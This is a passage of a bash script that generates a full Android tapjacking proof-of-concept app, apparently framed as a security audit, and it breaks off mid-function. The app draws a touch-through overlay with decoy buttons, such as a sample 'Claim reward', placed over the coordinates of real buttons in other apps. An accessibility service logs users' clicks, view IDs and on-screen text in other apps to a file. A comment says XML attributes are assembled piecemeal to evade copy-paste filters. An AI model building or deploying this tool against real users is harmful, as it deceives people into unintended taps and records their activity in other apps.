#!/bin/bash
set -e



PROJECT_DIR="TapjackPoC"
PKG_NAME="com.audit.tapjackpoc"
PKG_PATH="com/audit/tapjackpoc"



for cmd in java curl unzip python3; do
   if ! command -v "$cmd" &> /dev/null; then
       echo "[!] Error: Required command '$cmd' is not installed."
       exit 1
   fi
done



if [ -z "$ANDROID_HOME" ] && [ -z "$ANDROID_SDK_ROOT" ]; then
   echo "[!] Error: ANDROID_HOME is not set. Please configure your Android SDK path first."
   exit 1
fi



RAW_JAVA_VER=$(java -version 2>&1 | awk -F '"' '/version/ {print $2}')
if [[ "$RAW_JAVA_VER" == 1.* ]]; then
   JAVA_MAJOR=$(echo "$RAW_JAVA_VER" | cut -d'.' -f2)
else
   JAVA_MAJOR=$(echo "$RAW_JAVA_VER" | cut -d'.' -f1)
fi



echo "[*] Detected Java version: $RAW_JAVA_VER (Major: $JAVA_MAJOR)"



if [ "$JAVA_MAJOR" -ge 21 ]; then
   GRADLE_VER="8.9"
   AGP_VER="8.5.2"
   KOTLIN_VER="1.9.24"
   JVM_TARGET="21"
   JAVA_COMPAT="JavaVersion.VERSION_21"
elif [ "$JAVA_MAJOR" -ge 17 ]; then
   GRADLE_VER="8.5"
   AGP_VER="8.2.2"
   KOTLIN_VER="1.9.22"
   JVM_TARGET="17"
   JAVA_COMPAT="JavaVersion.VERSION_17"
else
   echo "[!] Error: Java 17 or higher is required for modern Android builds (found Java $JAVA_MAJOR)."
   exit 1
fi



echo "[*] Selected Toolchain -> Gradle: $GRADLE_VER | AGP: $AGP_VER | Kotlin: $KOTLIN_VER | Target: JVM $JVM_TARGET"



echo "[*] Creating project directory structure..."
rm -rf "$PROJECT_DIR"
mkdir -p "$PROJECT_DIR/app/src/main/java/$PKG_PATH"
cd "$PROJECT_DIR"



export PKG_NAME PKG_PATH AGP_VER KOTLIN_VER JVM_TARGET JAVA_COMPAT



python3 - << 'PYEOF'
import os



pkg_name = os.environ["PKG_NAME"]
pkg_path = os.environ["PKG_PATH"]
agp_ver = os.environ["AGP_VER"]
kotlin_ver = os.environ["KOTLIN_VER"]
jvm_target = os.environ["JVM_TARGET"]
java_compat = os.environ["JAVA_COMPAT"]



# Costruzione dinamica degli attributi XML per evitare filtri di copia-incolla
A_NAME = "android" + ":" + "name"
A_LABEL = "android" + ":" + "label"
A_THEME = "android" + ":" + "theme"
A_EXP = "android" + ":" + "exported"
A_FGS = "android" + ":" + "foregroundServiceType"
A_VAL = "android" + ":" + "value"
XMLNS = "xmlns" + ":" + "android"



with open("gradle.properties", "w") as f:
   f.write("android.useAndroidX=true\n")



with open("settings.gradle", "w") as f:
   f.write("""pluginManagement {
   repositories {
       google()
       mavenCentral()
       gradlePluginPortal()
   }
}
dependencyResolutionManagement {
   repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
   repositories {
       google()
       mavenCentral()
   }
}
rootProject.name = "TapjackPoC"
include ':app'
""")



with open("build.gradle", "w") as f:
   f.write(f"""plugins {{
   id 'com.android.application' version '{agp_ver}' apply false
   id 'org.jetbrains.kotlin.android' version '{kotlin_ver}' apply false
}}
""")



with open("app/build.gradle", "w") as f:
   f.write(f"""plugins {{
   id 'com.android.application'
   id 'org.jetbrains.kotlin.android'
}}



android {{
   namespace '{pkg_name}'
   compileSdk 34



   defaultConfig {{
       applicationId "{pkg_name}"
       minSdk 26
       targetSdk 34
       versionCode 1
       versionName "1.0"
   }}



   compileOptions {{
       sourceCompatibility {java_compat}
       targetCompatibility {java_compat}
   }}
   kotlinOptions {{
       jvmTarget = '{jvm_target}'
   }}
}}



dependencies {{
   implementation 'androidx.core:core-ktx:1.12.0'
}}
""")



A_PERM = "android" + ":" + "permission"
A_RES = "android" + ":" + "resource"
A_DESC = "android" + ":" + "description"



os.makedirs("app/src/main/res/xml", exist_ok=True)
os.makedirs("app/src/main/res/values", exist_ok=True)



def write_src(name, body):
   # Raw Kotlin templates: __PKG__ is substituted, no f-string brace escaping needed
   with open(f"app/src/main/java/{pkg_path}/{name}", "w") as f:
       f.write(body.replace("__PKG__", pkg_name))



manifest_content = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest {XMLNS}="http://schemas.android.com/apk/res/android">



   <uses-permission {A_NAME}="android.permission.SYSTEM_ALERT_WINDOW" />
   <uses-permission {A_NAME}="android.permission.FOREGROUND_SERVICE" />
   <uses-permission {A_NAME}="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
   <uses-permission {A_NAME}="android.permission.POST_NOTIFICATIONS" />



   <application
       {A_LABEL}="Tapjack PoC"
       {A_THEME}="@android:style/Theme.Material.Light.NoActionBar">



       <activity
           {A_NAME}=".MainActivity"
           {A_EXP}="true">
           <intent-filter>
               <action {A_NAME}="android.intent.action.MAIN" />
               <category {A_NAME}="android.intent.category.LAUNCHER" />
           </intent-filter>
       </activity>



       <service
           {A_NAME}=".OverlayService"
           {A_EXP}="true"
           {A_FGS}="specialUse">
           <property
               {A_NAME}="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
               {A_VAL}="Security audit overlay testing" />
       </service>



       <service
           {A_NAME}=".TapLoggerService"
           {A_LABEL}="Tapjack PoC Tap Logger"
           {A_PERM}="android.permission.BIND_ACCESSIBILITY_SERVICE"
           {A_EXP}="true">
           <intent-filter>
               <action {A_NAME}="android.accessibilityservice.AccessibilityService" />
           </intent-filter>
           <meta-data
               {A_NAME}="android.accessibilityservice"
               {A_RES}="@xml/tap_logger_config" />
       </service>
   </application>
</manifest>
"""



with open("app/src/main/AndroidManifest.xml", "w") as f:
   f.write(manifest_content)



with open("app/src/main/res/values/strings.xml", "w") as f:
   f.write("""<?xml version="1.0" encoding="utf-8"?>
<resources>
   <string name="tap_logger_desc">Logs clicks delivered to other apps while the tapjacking overlay is active, to verify whether touches pass through the overlay (missing filterTouchesWhenObscured / untrusted-touch mitigations).</string>
</resources>
""")



with open("app/src/main/res/xml/tap_logger_config.xml", "w") as f:
   f.write(f"""<?xml version="1.0" encoding="utf-8"?>
<accessibility-service {XMLNS}="http://schemas.android.com/apk/res/android"
   {A_DESC}="@string/tap_logger_desc"
   android:accessibilityEventTypes="typeViewClicked|typeViewLongClicked|typeWindowStateChanged"
   android:accessibilityFeedbackType="feedbackGeneric"
   android:accessibilityFlags="flagReportViewIds|flagIncludeNotImportantViews|flagRetrieveInteractiveWindows"
   android:canRetrieveWindowContent="true"
   android:notificationTimeout="0" />
""")



write_src("TapLog.kt", r'''package __PKG__

import android.content.Context
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/** Logs to logcat (tag TapjackPoC), an app-specific file and an in-memory ring buffer for the UI. */
object TapLog {
    const val TAG = "TapjackPoC"
    private const val MAX_LINES = 300
    private val buffer = ArrayDeque<String>()
    private val fmt = SimpleDateFormat("HH:mm:ss.SSS", Locale.US)

    fun file(ctx: Context): File = File(ctx.getExternalFilesDir(null) ?: ctx.filesDir, "taps.log")

    @Synchronized
    fun log(ctx: Context, msg: String) {
        val line = "${fmt.format(Date())} $msg"
        Log.i(TAG, msg)
        buffer.addLast(line)
        while (buffer.size > MAX_LINES) buffer.removeFirst()
        try {
            file(ctx).appendText(line + "\n")
        } catch (e: Exception) {
            Log.w(TAG, "log file write failed", e)
        }
    }

    @Synchronized
    fun recent(): List<String> = buffer.toList()

    @Synchronized
    fun clear(ctx: Context) {
        buffer.clear()
        file(ctx).delete()
    }
}
''')



write_src("OverlayState.kt", r'''package __PKG__

import android.graphics.Rect

/** Shared overlay geometry so the tap logger can tell whether a clicked view sits under the overlay. */
object OverlayState {
    @Volatile var active = false
    @Volatile var alpha = 0f
    private val rect = Rect()

    @Synchronized
    fun set(r: Rect, a: Float) {
        rect.set(r); alpha = a; active = true
    }

    @Synchronized
    fun clear() {
        rect.setEmpty(); active = false
    }

    @Synchronized
    fun describe(): String = if (active) "${rect.toShortString()} alpha=$alpha" else "inactive"

    /**
     * COVERED  -> clicked view bounds fully inside the overlay (touch went through an obscuring window)
     * PARTIAL  -> view bounds intersect the overlay (window partially obscured)
     * OUTSIDE  -> no intersection
     * OFF      -> overlay not active
     */
    @Synchronized
    fun relation(viewBounds: Rect): String = when {
        !active -> "OFF"
        viewBounds.isEmpty -> "UNKNOWN"
        rect.contains(viewBounds) -> "COVERED"
        Rect.intersects(rect, viewBounds) -> "PARTIAL"
        else -> "OUTSIDE"
    }
}
''')



write_src("TapLoggerService.kt", r'''package __PKG__

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.Context
import android.graphics.Rect
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent

/**
 * Logs clicks that actually reach views of other apps. With the overlay active, a CLICK tagged
 * COVERED/PARTIAL means the touch was dispatched to the target despite the obscuring window,
 * i.e. no filterTouchesWhenObscured / onFilterTouchEventForSecurity / FLAG_WINDOW_IS_OBSCURED check.
 * Taps the target filters out (or that Android 12+ blocks as untrusted) produce no event.
 */
class TapLoggerService : AccessibilityService() {

    private var lastForeground: String? = null

    override fun onServiceConnected() {
        TapLog.log(this, "[a11y] tap logger connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (pkg != lastForeground) {
                    lastForeground = pkg
                    TapLog.log(this, "[window] foreground=$pkg cls=${event.className}")
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> logClick(event, pkg, "CLICK")
            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> logClick(event, pkg, "LONG_CLICK")
        }
    }

    private fun logClick(event: AccessibilityEvent, pkg: String, kind: String) {
        val bounds = Rect()
        val node = event.source
        val cls: CharSequence?
        val id: String?
        val text: CharSequence?
        val desc: CharSequence?
        if (node != null) {
            node.getBoundsInScreen(bounds)
            cls = node.className
            id = node.viewIdResourceName
            text = node.text
            desc = node.contentDescription
        } else {
            cls = event.className
            id = null
            text = event.text.joinToString(" ")
            desc = event.contentDescription
        }
        val rel = OverlayState.relation(bounds)
        ClickHistory.add(ClickRecord(pkg, id, clean(text).ifBlank { clean(desc) }, Rect(bounds)))
        TapLog.log(
            this,
            "[$kind] overlay=$rel pkg=$pkg cls=$cls id=${id ?: "-"} " +
                "text=\"${clean(text)}\" desc=\"${clean(desc)}\" bounds=${bounds.toShortString()}"
        )
    }

    private fun clean(s: CharSequence?): String =
        s?.toString()?.replace('\n', ' ')?.let { if (it.length > 80) it.take(80) + "…" else it } ?: ""

    override fun onInterrupt() {}

    override fun onDestroy() {
        TapLog.log(this, "[a11y] tap logger disconnected")
        super.onDestroy()
    }

    companion object {
        fun isEnabled(ctx: Context): Boolean {
            val me = ComponentName(ctx, TapLoggerService::class.java).flattenToString()
            val enabled = Settings.Secure.getString(
                ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            return enabled.split(':').any { it.equals(me, ignoreCase = true) }
        }
    }
}
''')



write_src("ClickHistory.kt", r'''package __PKG__

import android.graphics.Rect

data class ClickRecord(val pkg: String, val id: String?, val text: String, val bounds: Rect)

/** Last clicks seen by the tap logger, used by the editor to place decoys over real targets. */
object ClickHistory {
    private const val MAX = 15
    private val items = ArrayDeque<ClickRecord>()

    @Synchronized
    fun add(r: ClickRecord) {
        if (r.bounds.isEmpty) return
        items.addFirst(r)
        while (items.size > MAX) items.removeLast()
    }

    @Synchronized
    fun recent(): List<ClickRecord> = items.toList()
}
''')



write_src("OverlayConfig.kt", r'''package __PKG__

import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.Rect
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

data class OverlayElement(
    val type: String,
    val text: String,
    val bounds: Rect,
    val textSize: Float?,
    val textColor: Int?,
    val bgColor: Int?,
    val gravity: String?
)

/**
 * Decoy element config. Accepted JSON: an array of elements, or {"elements": [...]}.
 * Element: {"type":"button|label","text":"..","bounds":"[l,t][r,b]",
 *           "textSize":16,"textColor":"#FFFFFF","bgColor":"#1E88E5","gravity":"center|start|end"}
 * Bounds use the same format the tap logger prints (Rect.toShortString), or "l,t,r,b".
 */
object OverlayConfig {
    private const val PREFS = "overlay"
    private const val KEY = "elements_json"

    const val SAMPLE = """{
  "elements": [
    {"type": "label", "text": "Tap below to continue", "bounds": "[100,900][980,1000]"},
    {"type": "button", "text": "Claim reward", "bounds": "[100,1050][980,1200]",
     "textColor": "#FFFFFF", "bgColor": "#1E88E5"}
  ]
}"""

    private val BRACKET = Regex("""\[\s*(-?\d+)\s*,\s*(-?\d+)\s*]\s*\[\s*(-?\d+)\s*,\s*(-?\d+)\s*]""")
    private val CSV = Regex("""^\s*(-?\d+)\s*,\s*(-?\d+)\s*,\s*(-?\d+)\s*,\s*(-?\d+)\s*$""")

    fun parseBounds(s: String?): Rect? {
        if (s == null) return null
        val m = BRACKET.find(s) ?: CSV.find(s) ?: return null
        val (l, t, r, b) = m.destructured
        val rect = Rect(l.toInt(), t.toInt(), r.toInt(), b.toInt())
        return if (rect.width() > 0 && rect.height() > 0) rect else null
    }

    /** "#RRGGBB", "#AARRGGBB", color names supported by Color.parseColor, or "transparent". */
    fun parseColor(s: String?): Int? {
        if (s.isNullOrBlank()) return null
        if (s.trim().equals("transparent", ignoreCase = true)) return Color.TRANSPARENT
        return try { Color.parseColor(s.trim()) } catch (e: IllegalArgumentException) { null }
    }

    fun loadSaved(ctx: Context): String =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString(KEY, "") ?: ""

    fun save(ctx: Context, json: String) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putString(KEY, json).apply()
    }

    /** Returns (source description, raw JSON). Precedence: inline extra > file extra > saved config. */
    fun resolve(ctx: Context, intent: Intent?): Pair<String, String> {
        intent?.getStringExtra("elements")?.let { return "extra" to it }
        intent?.getStringExtra("elements_file")?.let { name ->
            val f = if (name.startsWith("/")) File(name)
                    else File(ctx.getExternalFilesDir(null) ?: ctx.filesDir, name)
            return "file:${f.absolutePath}" to f.readText()
        }
        return "saved" to loadSaved(ctx)
    }

    /** Normalizes input to a JSONArray of elements. Throws on malformed JSON. */
    fun toArray(json: String): JSONArray {
        val t = json.trim()
        return when {
            t.isEmpty() -> JSONArray()
            t.startsWith("[") -> JSONArray(t)
            t.startsWith("{") -> JSONObject(t).optJSONArray("elements") ?: JSONArray()
            else -> throw IllegalArgumentException("expected a JSON array or an object with \"elements\"")
        }
    }

    /** Returns (valid elements, warnings for skipped/invalid entries). Throws on malformed JSON. */
    fun parse(json: String): Pair<List<OverlayElement>, List<String>> {
        val arr = toArray(json)
        val out = mutableListOf<OverlayElement>()
        val warnings = mutableListOf<String>()
        for (i in 0 until arr.length()) {
            val o = arr.optJSONObject(i)
            if (o == null) { warnings += "element #$i is not an object - skipped"; continue }
            val type = o.optString("type", "button").lowercase()
            if (type != "button" && type != "label") {
                warnings += "element #$i unknown type '$type' - skipped"; continue
            }
            val bounds = parseBounds(o.optString("bounds", ""))
            if (bounds == null) {
                warnings += "element #$i invalid/missing bounds '${o.optString("bounds", "")}' - skipped"; continue
            }
            fun color(key: String): Int? {
                if (!o.has(key)) return null
                return parseColor(o.optString(key)) ?: run {
                    warnings += "element #$i invalid $key '${o.optString(key)}' - ignored"; null
                }
            }
            out += OverlayElement(
                type = type,
                text = o.optString("text", ""),
                bounds = bounds,
                textSize = if (o.has("textSize")) o.optDouble("textSize").toFloat() else null,
                textColor = color("textColor"),
                bgColor = color("bgColor"),
                gravity = if (o.has("gravity")) o.optString("gravity") else null
            )
        }
        return out to warnings
    }
}
''')



write_src("OverlayService.kt", r'''package __PKG__

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Rect
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.TextView

class OverlayService : Service() {

    private var windowManager: WindowManager? = null
    private var overlayView: FrameLayout? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Must be called promptly after startForegroundService(), even if we bail out below
        startForegroundNotification()

        if (!Settings.canDrawOverlays(this)) {
            TapLog.log(this, "[overlay] SYSTEM_ALERT_WINDOW not granted - aborting")
            notifyPermissionMissing()
            stopSelf()
            return START_NOT_STICKY
        }

        lastStartExtras = intent?.extras?.let { Bundle(it) }

        val width = intent?.getIntExtra("width", WindowManager.LayoutParams.MATCH_PARENT)
            ?: WindowManager.LayoutParams.MATCH_PARENT
        val height = intent?.getIntExtra("height", WindowManager.LayoutParams.MATCH_PARENT)
            ?: WindowManager.LayoutParams.MATCH_PARENT
        val alphaVal = intent?.getFloatExtra("alpha", 0.4f) ?: 0.4f

        val boundsStr = intent?.getStringExtra("bounds")
        val bounds = OverlayConfig.parseBounds(boundsStr)
        if (boundsStr != null && bounds == null) {
            TapLog.log(this, "[overlay] invalid bounds '$boundsStr' - falling back to width/height")
        }

        val bgStr = intent?.getStringExtra("background")
        val bg = OverlayConfig.parseColor(bgStr) ?: run {
            if (bgStr != null) TapLog.log(this, "[overlay] invalid background '$bgStr' - using red")
            Color.RED
        }

        showOverlay(width, height, bounds, alphaVal, bg, loadElements(intent))
        return START_NOT_STICKY
    }

    private fun loadElements(intent: Intent?): List<OverlayElement> {
        var source = "?"
        return try {
            val (src, json) = OverlayConfig.resolve(this, intent)
            source = src
            val (elements, warnings) = OverlayConfig.parse(json)
            warnings.forEach { TapLog.log(this, "[overlay] $it ($src)") }
            if (elements.isNotEmpty()) TapLog.log(this, "[overlay] ${elements.size} decoy element(s) from $src")
            elements
        } catch (e: Exception) {
            TapLog.log(this, "[overlay] element config error ($source): ${e.javaClass.simpleName}: ${e.message}")
            emptyList()
        }
    }

    private fun showOverlay(
        width: Int, height: Int, bounds: Rect?, alphaVal: Float, bg: Int, elements: List<OverlayElement>
    ) {
        removeOverlay()
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        windowManager = wm

        val params = WindowManager.LayoutParams(
            bounds?.width() ?: width,
            bounds?.height() ?: height,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        ).apply {
            if (bounds != null) {
                gravity = Gravity.TOP or Gravity.START
                x = bounds.left
                y = bounds.top
            } else {
                gravity = Gravity.CENTER
            }
            alpha = alphaVal
            if (Build.VERSION.SDK_INT >= 30) {
                layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS
            } else if (Build.VERSION.SDK_INT >= 28) {
                layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }

        val container = FrameLayout(this).apply { setBackgroundColor(bg) }
        val elementViews = elements.map { e ->
            buildElementView(e).also { container.addView(it, FrameLayout.LayoutParams(e.bounds.width(), e.bounds.height())) }
        }

        try {
            wm.addView(container, params)
        } catch (e: Exception) {
            TapLog.log(this, "[overlay] addView failed: ${e.javaClass.simpleName}: ${e.message}")
            stopSelf()
            return
        }
        overlayView = container

        // Decoys are specified in screen coordinates; convert to window-local margins once the
        // real window origin is known. Re-applied whenever the origin changes (insets, rotation).
        var lastRect: Rect? = null
        container.addOnLayoutChangeListener { v, _, _, _, _, _, _, _, _ ->
            val loc = IntArray(2)
            v.getLocationOnScreen(loc)
            val r = Rect(loc[0], loc[1], loc[0] + v.width, loc[1] + v.height)
            if (r == lastRect) return@addOnLayoutChangeListener
            lastRect = r

            OverlayState.set(r, alphaVal)
            TapLog.log(this, "[overlay] shown rect=${r.toShortString()} alpha=$alphaVal")
            if (bounds != null && r != bounds) {
                TapLog.log(this, "[overlay] WARNING: requested bounds ${bounds.toShortString()} " +
                    "but system placed window at ${r.toShortString()}")
            }

            elements.forEachIndexed { i, e ->
                val lp = elementViews[i].layoutParams as FrameLayout.LayoutParams
                lp.leftMargin = e.bounds.left - r.left
                lp.topMargin = e.bounds.top - r.top
                elementViews[i].layoutParams = lp
                val clip = when {
                    r.contains(e.bounds) -> ""
                    Rect.intersects(r, e.bounds) -> " (partially clipped by window)"
                    else -> " (outside window - not visible)"
                }
                TapLog.log(this, "[overlay] element #$i ${e.type} \"${e.text}\" at ${e.bounds.toShortString()}$clip")
            }
        }
    }

    private fun buildElementView(e: OverlayElement): View {
        val v: TextView = if (e.type == "button") {
            Button(this).apply { isAllCaps = false }
        } else {
            TextView(this).apply { setTextColor(Color.BLACK) }
        }
        v.text = e.text
        e.textSize?.let { v.textSize = it }
        e.textColor?.let { v.setTextColor(it) }
        e.bgColor?.let { v.setBackgroundColor(it) }
        v.gravity = when (e.gravity?.lowercase()) {
            "start", "left" -> Gravity.START or Gravity.CENTER_VERTICAL
            "end", "right" -> Gravity.END or Gravity.CENTER_VERTICAL
            else -> Gravity.CENTER
        }
        // Exact size must win over Button's default min dimensions
        v.minWidth = 0; v.minHeight = 0; v.minimumWidth = 0; v.minimumHeight = 0
        v.setPadding(8, 0, 8, 0)
        v.isClickable = false
        v.isFocusable = false
        return v
    }

    private fun startForegroundNotification() {
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(
            NotificationChannel(CHANNEL_ID, "Tapjack Audit Service", NotificationManager.IMPORTANCE_LOW)
        )

        val notification = Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Tapjack Audit Overlay Active")
            .setContentText("Testing pass-through touch filtering")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .build()

        startForeground(FGS_NOTIF_ID, notification)
    }

    private fun notifyPermissionMissing() {
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(
            NotificationChannel(ALERT_CHANNEL_ID, "Tapjack Permission Alerts", NotificationManager.IMPORTANCE_HIGH)
        )
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val n = Notification.Builder(this, ALERT_CHANNEL_ID)
            .setContentTitle("Overlay permission missing")
            .setContentText("Tap to grant \"Display over other apps\"")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentIntent(pi)
            .setAutoCancel(true)
            .build()
        manager.notify(ALERT_NOTIF_ID, n)
    }

    private fun removeOverlay() {
        overlayView?.let {
            windowManager?.removeView(it)
            overlayView = null
            OverlayState.clear()
            TapLog.log(this, "[overlay] removed")
        }
    }

    override fun onDestroy() {
        removeOverlay()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val CHANNEL_ID = "tapjack_poc_channel"
        private const val ALERT_CHANNEL_ID = "tapjack_poc_alerts"
        private const val FGS_NOTIF_ID = 1
        private const val ALERT_NOTIF_ID = 2

        /** Extras of the last start (adb or UI), so the editor can re-apply decoys with the same window. */
        @Volatile var lastStartExtras: Bundle? = null
    }
}
''')



write_src("MainActivity.kt", r'''package __PKG__

import android.Manifest
import android.app.Activity
import android.app.AlertDialog
import android.content.ActivityNotFoundException
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import org.json.JSONObject

class MainActivity : Activity() {

    private lateinit var statusView: TextView
    private lateinit var logView: TextView
    private lateinit var editor: EditText
    private var permissionDialog: AlertDialog? = null
    private var promptedThisSession = false
    private val handler = Handler(Looper.getMainLooper())
    private val refresher = object : Runnable {
        override fun run() {
            refreshLog()
            handler.postDelayed(this, 1000)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 48, 48, 48)
        }

        statusView = TextView(this).apply { textSize = 14f }
        layout.addView(statusView)

        layout.addView(row(
            button("Grant Overlay Permission") { showPermissionDialog() },
            button("Enable Tap Logger") { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
        ))
        layout.addView(row(
            button("Start Full Overlay") { startOverlay(null, null) },
            button("Start Partial (300x300)") { startOverlay(300, 300) }
        ))
        layout.addView(row(
            button("Stop Overlay") { stopService(Intent(this, OverlayService::class.java)) },
            button("Clear Log") { TapLog.clear(this); refreshLog() }
        ))

        layout.addView(header("Decoy elements (JSON, screen coords)"))
        editor = EditText(this).apply {
            typeface = Typeface.MONOSPACE
            textSize = 12f
            minLines = 6
            gravity = Gravity.TOP or Gravity.START
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_FLAG_MULTI_LINE or
                InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS
            hint = OverlayConfig.SAMPLE
            setText(OverlayConfig.loadSaved(this@MainActivity))
        }
        layout.addView(editor)
        layout.addView(row(
            button("Add From Recent Click") { pickRecentClick() },
            button("Insert Sample") { editor.setText(OverlayConfig.SAMPLE) }
        ))
        layout.addView(row(
            button("Save & Apply") { saveAndApply() },
            button("Clear Elements") { editor.setText(""); saveAndApply() }
        ))

        layout.addView(header("Log (newest first)"))
        logView = TextView(this).apply {
            typeface = Typeface.MONOSPACE
            textSize = 11f
            setTextIsSelectable(true)
        }
        layout.addView(logView)

        setContentView(ScrollView(this).apply { addView(layout) })

        if (Build.VERSION.SDK_INT >= 33 &&
            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED
        ) {
            requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1)
        }
    }

    override fun onResume() {
        super.onResume()
        refreshStatus()
        handler.post(refresher)
        if (!Settings.canDrawOverlays(this) && !promptedThisSession) {
            promptedThisSession = true
            showPermissionDialog()
        }
    }

    override fun onPause() {
        handler.removeCallbacks(refresher)
        super.onPause()
    }

    private fun button(label: String, action: () -> Unit) = Button(this).apply {
        text = label
        isAllCaps = false
        setOnClickListener { action() }
    }

    private fun row(vararg views: View) = LinearLayout(this).apply {
        orientation = LinearLayout.HORIZONTAL
        views.forEach { addView(it, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)) }
    }

    private fun header(text: String) = TextView(this).apply {
        this.text = text
        setTypeface(typeface, Typeface.BOLD)
        setPadding(0, 32, 0, 8)
    }

    private fun toast(msg: String) = Toast.makeText(this, msg, Toast.LENGTH_LONG).show()

    private fun startOverlay(width: Int?, height: Int?) {
        if (!Settings.canDrawOverlays(this)) {
            showPermissionDialog()
            return
        }
        if (!TapLoggerService.isEnabled(this)) {
            TapLog.log(this, "[warn] tap logger not enabled - taps under the overlay will not be logged")
        }
        val i = Intent(this, OverlayService::class.java)
        width?.let { i.putExtra("width", it) }
        height?.let { i.putExtra("height", it) }
        startForegroundService(i)
    }

    /** Validates and saves the editor JSON; restarts the overlay with its previous window extras if active. */
    private fun saveAndApply() {
        val json = editor.text.toString()
        try {
            val (elements, warnings) = OverlayConfig.parse(json)
            OverlayConfig.save(this, json)
            val msg = "Saved ${elements.size} element(s)" +
                if (warnings.isNotEmpty()) "\n" + warnings.joinToString("\n") else ""
            toast(msg)
        } catch (e: Exception) {
            toast("Invalid JSON: ${e.message}")
            return
        }
        if (OverlayState.active && Settings.canDrawOverlays(this)) {
            val i = Intent(this, OverlayService::class.java)
            OverlayService.lastStartExtras?.let {
                i.putExtras(it)
                // inline/file extras would take precedence over the saved config
                i.removeExtra("elements")
                i.removeExtra("elements_file")
            }
            startForegroundService(i)
        }
    }

    private fun pickRecentClick() {
        val clicks = ClickHistory.recent()
        if (clicks.isEmpty()) {
            toast("No clicks recorded yet. Enable the tap logger, stop the overlay and tap the target's buttons.")
            return
        }
        val labels = clicks.map { c ->
            "${c.pkg}\n${c.id ?: "-"} \"${c.text}\"\n${c.bounds.toShortString()}"
        }.toTypedArray()
        AlertDialog.Builder(this)
            .setTitle("Place decoy over...")
            .setItems(labels) { _, idx -> appendElement(clicks[idx]) }
            .show()
    }

    private fun appendElement(c: ClickRecord) {
        try {
            val arr = OverlayConfig.toArray(editor.text.toString())
            arr.put(JSONObject().apply {
                put("type", "button")
                put("text", c.text.ifBlank { "Click me" })
                put("bounds", c.bounds.toShortString())
            })
            editor.setText(JSONObject().put("elements", arr).toString(2).replace("\\/", "/"))
        } catch (e: Exception) {
            toast("Fix the JSON first: ${e.message}")
        }
    }

    private fun openSettings(primary: Intent, fallback: Intent) {
        try {
            startActivity(primary)
        } catch (e: ActivityNotFoundException) {
            try { startActivity(fallback) } catch (e2: ActivityNotFoundException) {
                toast("No settings activity found - use adb appops")
            }
        }
    }

    private fun showPermissionDialog() {
        if (Settings.canDrawOverlays(this)) {
            AlertDialog.Builder(this)
                .setTitle("Permission granted")
                .setMessage("\"Display over other apps\" is already granted.")
                .setPositiveButton(android.R.string.ok, null)
                .show()
            return
        }
        if (permissionDialog?.isShowing == true) return
        val appInfo = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
